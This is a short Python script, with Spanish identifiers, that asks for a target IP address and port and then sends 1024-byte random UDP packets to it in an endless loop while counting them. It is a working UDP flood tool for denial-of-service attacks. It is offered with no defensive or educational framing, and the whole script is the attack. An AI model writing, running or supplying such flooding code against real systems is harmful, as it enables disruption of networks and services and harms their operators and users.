import socket
import random

puerto = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
carga = random._urandom(1024)
ip = input("IP: ")
port = int(input("Puerto: "))
enviado = 0

while True:
    puerto.sendto(carga, (ip, port))
    print(f"Enviado {enviado} paquetes a {ip}:{port} ")
    enviado += 1

